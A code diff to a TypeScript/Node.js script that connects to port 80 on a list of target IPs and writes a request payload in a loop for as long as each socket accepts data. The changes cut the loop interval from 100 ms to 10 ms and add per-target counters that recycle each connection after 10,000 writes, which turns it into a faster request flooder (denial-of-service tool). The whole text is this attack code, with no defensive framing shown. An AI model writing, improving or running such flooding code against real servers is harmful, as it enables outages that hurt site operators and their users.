@@ -11,6 +11,7 @@ class Target {
         this.ip = ip;
     }
     public socket:net.Socket | null = null;
+    public madeRequests:number = 0;
 }
 
 let queue = new Set<Target>();
@@ -98,19 +99,20 @@ setInterval(()=>{
     for (let target of targets) {
         run(target);
     }
-}, 100);
+}, 10);
 
 function run(target:Target) {
     if (target.socket) {
         let prevSocket = target.socket;
         prevSocket.destroy(); 
+        target.madeRequests = 0;
     }
     var socket = new net.Socket();
     target.socket = socket;
     queue.delete(target);
     socket.connect(80, target.ip, function() {
         // console.log('Connected');
-        fuckClient(socket);
+        fuckClient(target);
     });
     
     socket.on('data', function(data:any) {
@@ -124,7 +126,7 @@ function run(target:Target) {
     socket.on('drain', function() {
         // console.log('drain');
         drains++;
-        fuckClient(socket);
+        fuckClient(target);
         // client.destroy(); // kill client after server's response
     });
 
@@ -140,19 +142,24 @@ function run(target:Target) {
     });
 }
 
-function fuckClient(client:net.Socket) {
+function fuckClient(target:Target) {
     let writeResult = false;
     do {
         inProgress++;
         counter++;
         totalRequestsMade++;
-        writeResult = client.write(text);
+        writeResult = target.socket!.write(text);
+        target.madeRequests++;
+        if (target.madeRequests >= 10000) {
+            target.socket?.destroy();
+            target.madeRequests = 0;
+            target.socket = null;
+            queue.add(target);
+            return;
+        }
     } while (writeResult == true);
     // console.log('writeResult: ' + writeResult);
 }
-
-   
-
 
 
 
